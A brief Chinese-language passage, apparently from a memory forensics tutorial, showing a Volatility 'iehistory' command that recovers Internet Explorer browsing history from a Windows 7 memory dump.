  \ Internet Explorer（显然也包含一些 Firefox 信息）的历史使用情况。\n\n```bash\nvolatility iehistory\
  \ -f [memorydumpfilename.raw] --profile=Win7SP1x86\n```\n\n此命令的运行可能需要一些时间，但它会返回大量信息：\n\
